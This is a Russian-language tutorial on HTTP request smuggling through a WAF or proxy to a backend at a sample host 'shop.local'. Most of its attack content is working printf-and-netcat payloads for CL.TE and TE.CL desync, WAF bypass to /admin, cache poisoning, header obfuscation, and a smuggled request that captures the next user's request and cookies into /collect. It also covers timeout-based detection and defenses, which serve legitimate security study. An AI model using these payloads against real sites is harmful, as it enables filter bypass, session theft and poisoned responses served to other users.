## Задача

Самый мощный обход периметра — **контрабанда HTTP-запросов** (request smuggling). Когда перед приложением стоит прокси или WAF, они и бэкенд могут по-разному определять, где заканчивается один запрос и начинается другой. Мы прячем «второй запрос» внутри первого — WAF его не видит, а бэкенд исполняет.

Разберём связку «WAF → бэкенд» и два вида контрабанды.

## Наш пример: прокси перед приложением

Схема: клиент → WAF/прокси → бэкенд. Оба читают `Content-Length` (CL, длина тела) и `Transfer-Encoding` (TE, тело чанками). Если CL и TE расходятся, парсеры считают границу по-разному.

Проверим, как WAF реагирует на «подозрительный» запрос:

```bash
$ printf 'POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 13\r\n\r\nGET /admin HTTP' | nc shop.local 80
HTTP/1.1 403 Forbidden   # WAF заблокировал видимый GET /admin
```

WAF видит `GET /admin` и блокирует. Теперь спрячем его в тело.

## Шаг 1: CL.TE — прокси по CL, бэкенд по TE

Прокси считает границу по `Content-Length`, а бэкенд — по `Transfer-Encoding: chunked`. Отправляем:

```bash
$ printf 'POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: shop.local\r\n\r\n' | nc shop.local 80
```

Прокси прочитал тело длиной 4 байта (`0\r\n\r\n`) и передал бэкенду только его. Бэкенд, разбирая chunked, увидел `0` (конец тела) и **следующий запрос `GET /admin`** как новый — исполнил его. WAF ничего не заметил.

> **Request smuggling** — расхождение в определении границы запроса между двумя HTTP-парсерами. Спрятанный запрос обходит фильтр и попадает в бэкенд.

## Шаг 2: TE.CL — обратная ситуация

Теперь прокси по TE, бэкенд по CL:

```bash
$ printf 'POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc shop.local 80
```

Бэкенд прочитает `0\r\n\r\nX` (6 байт по CL), а остаток `X...` станет началом следующего запроса. Видов контрабанды много: `TE.CL`, `CL.TE`, `TE.TE` (двойной `Transfer-Encoding`), `TE.0`. Определить нужный помогает рассинхронизация таймаутов.

## Шаг 3: подтверждение контрабанды

Сначала — **безопасная проверка**: отправь запрос, который при удачном смагглинге даст задержку. Классика — заставить бэкенд ждать тело, которое не придёт:

```bash
$ time (printf 'POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc shop.local 80)
real 0m10.0s   # бэкенд ждёт остаток -> таймаут 10с = smuggling подтверждён
```

Задержка подтверждает расхождение без опасных действий. Инструмент — `smuggler.py` или Burp `HTTP Request Smuggler`.

## Шаг 4: cache poisoning через smuggling

Спрятанный запрос может быть запросом к **кэшу**. Если заставить кэш закэшировать чужой ответ, его получат другие пользователи:

```bash
# smuggled: GET /profile (наша страница) -> кэш сохранит её как ответ на /
# затем другой пользователь открывает / и видит наш профиль
```

Так же **cache poisoning** работает и без контрабанды — через незакэшированные заголовки (`X-Forwarded-Host`, `X-Forwarded-Scheme`), которые попадают в кэшируемый ответ. Проверка: подмени заголовок, запроси дважды, посмотри, вернулся ли твой вариант второму запросу.

## Шаг 5: как искать smuggling

- **Время:** отправь запрос с неверной длиной — если бэкенд «зависает» на таймаут, есть расхождение.
- **Вид:** перебирай `CL.TE`, `TE.CL`, `TE.TE`, `TE.0`, двойной `Transfer-Encoding`.
- **Инструменты:** `smuggler.py`, Burp `HTTP Request Smuggler`, `h2c`-варианты.
- **Кэш:** проверяй, попадают ли заголовки в кэшируемый ответ.
- **HTTP/2:** downgrade H2→H1 даёт новые расхождения (`H2.CL`).

## Если не сработало

- **Прокси нормализует заголовки** — пробуй обфускацию (`Transfer-Encoding :`, `\x0b`, регистр).
- **Оба парсера по TE** — используй `TE.TE` с разными значениями.
- **Нет прокси** — контрабанда не нужна; переходи к cache poisoning напрямую.
- **Кэш игнорирует заголовки** — ищи ключ кэша и незакэшированные параметры.

## Что мы теперь знаем

- Контрабанда — расхождение парсеров в определении границы запроса (CL vs TE).
- Виды: `CL.TE`, `TE.CL`, `TE.TE`, `TE.0`; подтверждается таймаутом.
- Спрятанный запрос обходит WAF и исполняется бэкендом.
- Cache poisoning кэширует чужой ответ и отдаёт его другим пользователям.

## Частые вопросы

**Зачем нужна контрабанда, если можно просто послать запрос?** Потому что WAF/прокси **видит** твой запрос и блокирует. Контрабанда прячет второй запрос внутри первого — фильтр его не разбирает.

**Почему это вообще работает?** Потому что HTTP допускает разную трактовку границы тела: `Content-Length` и `Transfer-Encoding` могут противоречить, и разные парсеры выберут разное.

**Как определить нужный вариант (CL.TE или TE.CL)?** По времени реакции: отправь запрос с неверной длиной — если бэкенд «зависает» на таймаут, расхождение есть. Дальше перебирай виды.

**Это опасно для продакшена?** Может положить соединения и отравить кэш для других. Поэтому сначала — только **таймаут-детект**, без реального смагглинга чужого трафика.

**Cache poisoning — это то же самое?** Родственно: отравленный ответ кэшируется и раздаётся другим. Может достигаться и без контрабанды, через незакэшированные заголовки.

**Как защититься?** Использовать один HTTP-парсер на всём пути, нормализовать заголовки, отключить `Transfer-Encoding` там, где он не нужен.

## Ещё один сценарий: кража чужого запроса через smuggling

Контрабанда позволяет не только обойти WAF, но и **украсть запрос следующего пользователя**. Идея: оставляем в соединении «хвост», и бэкенд склеивает его со следующим запросом жертвы.

```bash
# smuggled-запрос, который заставит следующий запрос жертвы уйти на наш путь
POST / HTTP/1.1
Host: shop.local
Content-Length: 4
Transfer-Encoding: chunked

0

POST /collect HTTP/1.1
Host: shop.local
Content-Length: 100
```
Далее в теле мы отправляем 100 байт-заглушек, которые «съедят» начало следующего запроса (включая cookie жертвы), и её данные уйдут на `/collect`. Это **request smuggling + hijacking**.

Проверять такое нужно аккуратно: сначала таймаут-детект, а «крадущие» варианты — только в изолированной лаборатории.

## На что смотреть дальше

- **Виды.** `CL.TE`, `TE.CL`, `TE.TE`, `TE.0`, `H2.CL` (downgrade).
- **Обфускация заголовков.** `Transfer-Encoding :`, регистр, `\x0b`.
- **Детект.** Запрос с неверной длиной → таймаут бэкенда.
- **Cache poisoning.** Отравленный ответ раздаётся другим.
- **Инструменты.** Burp `HTTP Request Smuggler`, `smuggler.py`.
- **Безопасность.** Только таймаут-детект на проде; эксплуатация — изолированно.
